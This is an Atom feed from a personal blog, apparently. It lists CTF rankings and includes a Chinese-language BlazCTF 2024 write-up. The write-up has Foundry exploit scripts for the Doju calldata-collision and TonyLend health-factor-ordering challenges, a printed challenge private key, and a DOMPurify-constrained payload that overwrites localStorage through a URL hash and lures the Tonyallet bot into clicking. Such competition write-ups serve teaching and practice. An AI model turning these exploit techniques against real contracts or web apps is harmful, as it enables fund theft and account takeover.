<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
    <title>Random thoughts here</title>
    <subtitle>Some random notes from gtg2619</subtitle>
    <link rel="self" type="application/atom+xml" href="/atom.xml"/>
    <link rel="alternate" type="text/html" href="/"/>
    <generator uri="https://www.getzola.org/">Zola</generator>
    <updated>2025-02-16T23:55:17+08:00</updated>
    <id>/atom.xml</id>
    <entry xml:lang="en">
        <title>Selected awards with other teams</title>
        <published>2025-02-16T23:55:17+08:00</published>
        <updated>2025-02-16T23:55:17+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/i/sawards/"/>
        <id>/blog/i/sawards/</id>
        
        <content type="html" xml:base="/blog/i/sawards/">&lt;h3 id=&quot;onlypwner-2024-2&quot;&gt;Onlypwner 2024-2 –&lt;&#x2F;h3&gt;
&lt;p&gt;All solve in solo as &lt;code&gt;gtg2619&lt;&#x2F;code&gt;. Rank 3. Excellent and challenging range, recommanded.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;blazctf-2024-9-20-2024-9-22&quot;&gt;BlazCTF 2024-9-20 – 2024-9-22&lt;&#x2F;h3&gt;
&lt;p&gt;Rank13 as &lt;code&gt;只是心有不甘&lt;&#x2F;code&gt;. Various challenges. Received some nice swag.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;remedyctf-2025-1-24-2025-1-26&quot;&gt;RemedyCTF 2025-1-24 – 2025-1-26&lt;&#x2F;h3&gt;
&lt;p&gt;Rank 11 as &lt;code&gt;OUTOFGAS&lt;&#x2F;code&gt;. Audit-like, challenging and labor-intensive. Enjoy it in collaboration with two friends.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>blazctf Writeup in zh-CN and poorly edited</title>
        <published>2024-10-03T23:29:28+08:00</published>
        <updated>2024-10-03T23:29:28+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/blazctf2024/"/>
        <id>/blog/blazctf2024/</id>
        
        <content type="html" xml:base="/blog/blazctf2024/">&lt;h1 id=&quot;blazctf-by-zhi-shi-xin-you-bu-gan&quot;&gt;blazctf by 只是心有不甘&lt;&#x2F;h1&gt;
&lt;p&gt;[toc]&lt;&#x2F;p&gt;
&lt;p&gt;这次和&lt;code&gt;只是心有不甘&lt;&#x2F;code&gt;在 Fuzzland 组织的 BlazCTF 2024 得到了第十三名。记一下我解出的&#x2F;大量参与的题目&lt;&#x2F;p&gt;
&lt;h2 id=&quot;doju&quot;&gt;doju&lt;&#x2F;h2&gt;
&lt;p&gt;sellTokens的calldata可以conflicts到其他函数上。&lt;&#x2F;p&gt;
&lt;p&gt;爆一个地址以c47FcC04结尾，私钥为0x39219b428d7d21216ff07c8e1f61cd84b133b763854600ac5c48a6b402a43fee&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: GPL-3.0
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.20&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import {Script} from &amp;quot;forge-std&#x2F;Script.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {console} from &amp;quot;forge-std&#x2F;console.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {console2} from &amp;quot;forge-std&#x2F;console2.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {Challenge} from &amp;quot;..&#x2F;src&#x2F;Challenge.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {Doju} from &amp;quot;..&#x2F;src&#x2F;Doju.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Solve &lt;&#x2F;span&gt;&lt;span&gt;is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Script &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; challenge &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x21474f7350Ea47e17229ed1a27B43D17992A8777&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; doju &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0xC47fcC04762b188c3C5D1D01aBb279e21be4d6E9&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; bytes memory data = abi.encodePacked(uint256(0x7a4068dd0000000000000000000000000000000000c0ffeef000000000000000), address(0xC47fcC04762b188c3C5D1D01aBb279e21be4d6E9), uint256(1), address(0xaE6f4aE4C4a600bFc5717332E4d5F1CB1D2ABDfE), uint256(1));
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Doju&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(doju)).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sellTokens&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;), doju, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0xa9059cbb00000000000000000000000017F8A81Cf998b92B8A525E672AfC16B7&lt;&#x2F;span&gt;&lt;span&gt;));
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Doju&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(doju)).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sellTokens&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;), doju, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0xa9059cbb00000000000000000000000017F8A81Cf998b92B8A525E672AfC16B7&lt;&#x2F;span&gt;&lt;span&gt;));
&lt;&#x2F;span&gt;&lt;span&gt;        console.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Doju&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(doju)).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x17F8A81Cf998b92B8A525E672AfC16B7c47FcC04&lt;&#x2F;span&gt;&lt;span&gt;));
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x17F8A81Cf998b92B8A525E672AfC16B7c47FcC04&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;{value: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1 ether&lt;&#x2F;span&gt;&lt;span&gt;}(&amp;quot;&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        vm.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        vm.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x39219b428d7d21216ff07c8e1f61cd84b133b763854600ac5c48a6b402a43fee&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Doju&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(doju)).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0xc0ffee&lt;&#x2F;span&gt;&lt;span&gt;), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Doju&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(doju)).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x17F8A81Cf998b92B8A525E672AfC16B7c47FcC04&lt;&#x2F;span&gt;&lt;span&gt;));
&lt;&#x2F;span&gt;&lt;span&gt;        console.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Doju&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(doju)).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0xc0ffee&lt;&#x2F;span&gt;&lt;span&gt;)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(type(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;max&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;tonyallet&quot;&gt;Tonyallet&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;code&gt;&#x2F;post?id=&lt;&#x2F;code&gt;有一个DOMPurify latest，但是只有homepage可以xss&lt;&#x2F;p&gt;
&lt;p&gt;style + href应该可以改变界面位置，抢占goBack的位置使bot点击。但即使跳转回了也没办法执行，因为homepage的xss是交互式的DOM base。&lt;&#x2F;p&gt;
&lt;p&gt;通过审计tg的js，发现其内部initParams可以改部分内容&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2e3440;color:#d8dee9;&quot;&gt;&lt;code&gt;&lt;span&gt;webAppInitData = initParams.tgWebAppData;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;如果跳转附带hash即可覆盖locaStorage。&lt;&#x2F;p&gt;
&lt;p&gt;然后需要抓个自己的auth包，复制参数。&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2e3440;color:#d8dee9;&quot;&gt;&lt;code&gt;&lt;span&gt;https:&#x2F;&#x2F;tonyallet-us.ctf.so&#x2F;?#tgWebAppData=&amp;lt;urlencodeComponent(data)&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;由于我的 tg username 含 unicode导致了js的报错，遂修改。&lt;&#x2F;p&gt;
&lt;p&gt;在DOMPurify的限制下插入链接a元素，然后用CSS把他抬到界面顶部使机器人点击。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;htmlbars&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-htmlbars &quot;&gt;&lt;code class=&quot;language-htmlbars&quot; data-lang=&quot;htmlbars&quot;&gt;&lt;span&gt;&amp;lt;&#x2F;p&amp;gt;&amp;lt;div&amp;gt;&amp;lt;a href=&amp;#39;&#x2F;#tgWebAppData&amp;lt;urlencodeComponent(data)&amp;gt;&amp;#39; style=&amp;#39;font-size:50px;padding: 20px;position: absolute;top: 0;&amp;#39;&amp;gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;lt;&#x2F;a&amp;gt;&amp;lt;&#x2F;div&amp;gt;&amp;lt;p&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;claim flag…&lt;&#x2F;p&gt;
&lt;h2 id=&quot;tonylend&quot;&gt;Tonylend&lt;&#x2F;h2&gt;
&lt;p&gt;https:&#x2F;&#x2F;vscode.blockscan.com&#x2F;ethereum&#x2F;0x02950460e2b9529d0e00284a5fa2d7bdf3fa4d72&lt;&#x2F;p&gt;
&lt;p&gt;实际上可以claim到1e22的USDE和1e10的USDC，他们初始状态是等值的，也就是可以兑到2e22的USDE，还差1k多ether，可以考虑价格操纵（实际上是revenge的解法）&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;withdraw&lt;&#x2F;code&gt;先做的&lt;code&gt;calculateHealthFactor&lt;&#x2F;code&gt;才修改状态机，导致信用可以低于PRECISE。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: GPL-3.0
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.20&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import {Script} from &amp;quot;forge-std&#x2F;Script.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {console} from &amp;quot;forge-std&#x2F;console.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {console2} from &amp;quot;forge-std&#x2F;console2.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;..&#x2F;src&#x2F;TonyLend.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {Challenge} from &amp;quot;..&#x2F;src&#x2F;Challenge.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Solve &lt;&#x2F;span&gt;&lt;span&gt;is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Script &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; challenge &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x72998f0cffFe9Bf0fC7465188aCF3c5a8C77B616&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; tonyLend &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x73e590a8309C7FC79D9eBA47A5C0773F2c233D6b&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; usde &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x34FeD369D3EE0a030a0Bb9812634dd39fF739B80&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; usdc &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x842CD61BF1078a03E98fC9fd563069440aF20de1&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; player &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x6Fd418eD0a94f11d8678c7Ff72E92947A5a7fEf8&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;run &lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Challenge&lt;&#x2F;span&gt;&lt;span&gt;(challenge).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;claimDust&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;show&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;MintableERC20&lt;&#x2F;span&gt;&lt;span&gt;(usde).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(tonyLend, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1e22&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;TonyLend&lt;&#x2F;span&gt;&lt;span&gt;(tonyLend).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;deposit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1e22&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;MintableERC20&lt;&#x2F;span&gt;&lt;span&gt;(usdc).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(tonyLend, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1e10&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;TonyLend&lt;&#x2F;span&gt;&lt;span&gt;(tonyLend).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;deposit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1e10&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;TonyLend&lt;&#x2F;span&gt;&lt;span&gt;(tonyLend).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;borrow&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1.1926e22&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;TonyLend&lt;&#x2F;span&gt;&lt;span&gt;(tonyLend).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;withdraw&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1e22&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;show&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;MintableERC20&lt;&#x2F;span&gt;&lt;span&gt;(usde).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;transfer&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0xc0ffee&lt;&#x2F;span&gt;&lt;span&gt;), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2.1926e22&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;        console.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;isSolved?&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Challenge&lt;&#x2F;span&gt;&lt;span&gt;(challenge).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;isSolved&lt;&#x2F;span&gt;&lt;span&gt;());
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;show&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;internal &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        console.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;USDE&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;MintableERC20&lt;&#x2F;span&gt;&lt;span&gt;(usde).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(player));
&lt;&#x2F;span&gt;&lt;span&gt;        console.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;USDC&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;MintableERC20&lt;&#x2F;span&gt;&lt;span&gt;(usdc).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(player));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;但其实liquidate的逻辑也有bug。不过如果没有这个问题也无法执行liquidate。&lt;&#x2F;p&gt;
